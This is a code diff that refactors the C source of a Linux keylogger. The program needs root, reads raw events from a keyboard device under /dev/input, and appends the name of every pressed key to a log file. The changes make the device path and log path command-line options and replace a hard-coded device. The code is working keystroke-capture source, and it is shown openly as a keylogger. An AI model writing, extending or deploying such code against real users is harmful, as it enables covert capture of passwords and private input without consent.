@@ -10,12 +10,13 @@
 
 #include "key_util.h"
 #include "util.h"
+#include "options.h"
+#include "config.h"
 
 typedef struct input_event input_event;
 
 static void rootCheck();
-static char *getKeyboardDeviceFileName();
-static int openKeyboardDeviceFile();
+static int openKeyboardDeviceFile(char *deviceFile);
 
 /**
  * Exit with return code -1 if user does not have root privileges
@@ -28,21 +29,13 @@ static void rootCheck() {
 }
 
 /**
- * Detects and returns the name of the keyboard device file
- *
- * @return the name of the keyboard device file
- */
-static char *getKeyboardDeviceFileName() {
-   return "/dev/input/event3";
-}
-
-/**
  * Opens the keyboard device file
  *
- * @return the file descriptor on success, error code on failure
+ * @param  deviceFile   the path to the keyboard device file
+ * @return              the file descriptor on success, error code on failure
  */
-static int openKeyboardDeviceFile() {
-   int kbd_fd = open(getKeyboardDeviceFileName(), O_RDONLY);
+static int openKeyboardDeviceFile(char *deviceFile) {
+   int kbd_fd = open(deviceFile, O_RDONLY);
    if (kbd_fd == -1) {
       LOG_ERROR("%s", strerror(errno));
       exit(-1);
@@ -51,13 +44,16 @@ static int openKeyboardDeviceFile() {
    return kbd_fd;
 }
 
-int main() {
+int main(int argc, char **argv) {
    rootCheck();
 
-   int kbd_fd = openKeyboardDeviceFile();
+   Config config;
+   parseOptions(argc, argv, &config);
+
+   int kbd_fd = openKeyboardDeviceFile(config.deviceFile);
    assert(kbd_fd > 0);
 
-   FILE *logfile = fopen("/var/log/keylogger.log", "a");
+   FILE *logfile = fopen(config.logFile, "a");
    if (logfile == NULL) {
       LOG_ERROR("Could not open log file");
       exit(-1);
@@ -80,12 +76,13 @@ int main() {
             char *name = getKeyText(event.code);
             if (strcmp(name, UNKNOWN_KEY) != 0) {
                LOG("%s", name);
-               fprintf(logfile, "%s", name);
+               fputs(name, logfile);
             }
          }
       }
    }
 
+   Config_cleanup(&config);
    fclose(logfile);
    close(kbd_fd);
    return 0;
